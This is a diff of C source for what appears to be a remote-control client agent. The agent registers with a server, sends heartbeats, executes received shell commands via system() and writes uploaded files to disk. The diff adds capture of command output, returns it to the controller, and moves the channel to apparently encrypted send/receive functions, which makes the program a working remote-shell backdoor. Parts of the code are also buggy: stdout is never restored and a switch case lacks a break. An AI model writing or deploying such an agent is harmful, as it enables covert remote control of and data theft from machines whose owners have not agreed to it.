@@ -1,12 +1,12 @@
 #include "toolsfun.h"
 #include "contain.h"
 #include <unistd.h>
-#include "config.h"
+#include "configx.h"
 #include "socket_control.h"
 #include "project_head.h"
 #include "pthreadxsx.h"
 #include <fcntl.h>
-
+#include "encrypt.h"
 #define _GNU_SOURCE
 
 extern int extid;
@@ -36,15 +36,15 @@ int linkbash()
 	return true;
 }
 
-
-int report(int ans,int sock)
+int report(int ans,int sock, int loglen)
 {
 	U_MSG k;
 	k.type = T_ANSWR;
 	k.answer_m.id = extid;
 	k.answer_m.torf = ans;
-
-	int n = write(sock,&k,sizeof(U_MSG));
+	k.answer_m.loglen = loglen;
+	
+	int n = sendpt(sock,&k,sizeof(U_MSG));
 	if(n!=sizeof(U_MSG))
 	{
 		perror("write err");
@@ -52,49 +52,61 @@ int report(int ans,int sock)
 	}
 }
 
+int xsystem(char* shellbuf, int sock)
+{
+	int pipefd[2];
+	pipe(pipefd);
+	int fd = dup2(pipefd[1], STDOUT_FILENO);
+	DEBUGI(fd);
+	char buf[4096] = {0};
+	system(shellbuf);
+	int size = read(pipefd[0], buf, 4096);
+
+	int ans = report(1,sock,size);
+	if(ans == false)
+		return false;
+
+	size = sendpt(sock, buf, size);
+}
 
 int waiting(int sock)
 {
 	U_MSG k;
 	while(1)
 	{
-		int n = recv(sock,&k,sizeof(U_MSG),0);
-
+		int n = recvpt(sock,&k,sizeof(U_MSG));
+		DEBUGI(k.shell_m.commandlen);
 		if(n!=sizeof(U_MSG))
 		{
-			DEBUGW;
-			perror("read err");DEBUGW;
+			perror("read err");
 			return false;
 		}
 		switch(k.type)
 		{
 			case T_SHELL:
-			{
+			{	
 				char *shellbuf = (char*)malloc(k.shell_m.commandlen+1);
 				memset(shellbuf,0,k.shell_m.commandlen+1);
-				n = read(sock,shellbuf,k.shell_m.commandlen);
+				n = recvpt(sock,shellbuf,k.shell_m.commandlen);
 				if(n!=k.shell_m.commandlen)
 				{
-					perror("read err");DEBUGW;
+					perror("read err");
 					free(shellbuf);
 					return false;
 				}
 				printf("%s\n", shellbuf);
-				system(shellbuf);
+				xsystem(shellbuf, sock);
 				free(shellbuf);
-				int ans = report(1,sock);
-				if(ans == false)
-					return false;
 				break;
 			}
 			case T_TFILE:
 			{
 				char *tfilebuf = (char*)malloc(k.tfile_m.path+1);
 				memset(tfilebuf,0,k.tfile_m.path+1);
-				n = read(sock,tfilebuf,k.tfile_m.path);
+				n = recvpt(sock,tfilebuf,k.tfile_m.path);
 				if(n!=k.tfile_m.path)
 				{
-					perror("read err");DEBUGW;
+					perror("read err");
 					free(tfilebuf);
 					return false;
 				}
@@ -102,47 +114,43 @@ int waiting(int sock)
 				int fd = r_creatfile(tfilebuf);
 				if(fd == -1)
 				{
-					int ans = report(0,sock);
+					int ans = report(0,sock,0);
 					if(ans == false)
 						return false;
 					free(tfilebuf);
 					continue;
 				}
-				DEBUGW;
-				int ans = report(1,sock);
+				int ans = report(1,sock,0);
 				if(ans == false)
 					return false;
-				char buffile[4096] = {0};
-				int readsize, totalsize = 0;
-				do
-				{
-					DEBUGW;
-					readsize = read(sock, buffile, 4096);
-					totalsize+=readsize;
-					DEBUGI(readsize);
-					if(readsize <= 0)
-						break;
-					printf("%s\n", buffile);
-					write(fd, buffile, readsize);
-					if(totalsize == k.tfile_m.size)
-						break;
-					DEBUGW;
-				}while(1);
-/*				int pipefd[2];
-				int ret = pipe(pipefd);
-				DEBUGW;
-				ret = splice(sock,NULL,pipefd[1],NULL,k.tfile_m.size, 0);
-				ret = splice(pipefd[0], NULL, fd, NULL, k.tfile_m.size, 0);
-				if(ret == -1)
-				{
-					perror("read err");
-				}
-				DEBUGI(ret);DEBUGW;
-				close(pipefd[1]);
-				close(pipefd[0]);*/
-				close(fd);
-				DEBUGW;
 
+				char buffile[4096] = {0};
+				int ret;
+				if(k.tfile_m.size > 4096)
+				{
+					int times = k.tfile_m.size / 4096;
+					if(k.tfile_m.size%4096 != 0)
+						times += 1;
+					int i = 0;
+					for (; i < times; ++i)
+					{
+						if( (i == times-1) && ( k.tfile_m.size%4096 != 0) )
+							ret = recvpt(sock, buffile, k.tfile_m.size%4096);
+						else
+							ret = recvpt(sock, buffile, 4096);
+						if(ret <= 0)
+							break;
+						write(fd, buffile, ret);
+					}
+				}
+				else
+				{
+					ret = recvpt(sock, buffile, k.tfile_m.size);
+					if(ret <= 0)
+						break;
+					write(fd, buffile, ret);
+				}
+				close(fd);
 			}
 			default:
 				break;
@@ -248,17 +256,15 @@ int r_mkdir(char * path)
 }
 
 
-
-
 int rgist(int sock)
 {
 	U_MSG k;
 	k.regist_m.type = T_REGST;
 	k.regist_m.id = 0;
-	int n = write(sock,&k,sizeof(U_MSG));
+	int n = sendpt(sock,&k,sizeof(U_MSG));
 	if(n!=sizeof(U_MSG))
 		return false;
-	n = read(sock,&k,sizeof(U_MSG));
+	n = recvpt(sock,&k,sizeof(U_MSG));
 	if(n!=sizeof(U_MSG))
 		return false;
 	extid = k.regist_m.id;
@@ -271,7 +277,7 @@ int beatheart(int sock)
 	U_MSG k;
 	k.regist_m.type = T_HEART;
 	k.regist_m.id = extid;
-	int n = write(sock,&k,sizeof(U_MSG));
+	int n = sendpt(sock,&k,sizeof(U_MSG));
 	if(n!=sizeof(U_MSG))
 		return false;
 }
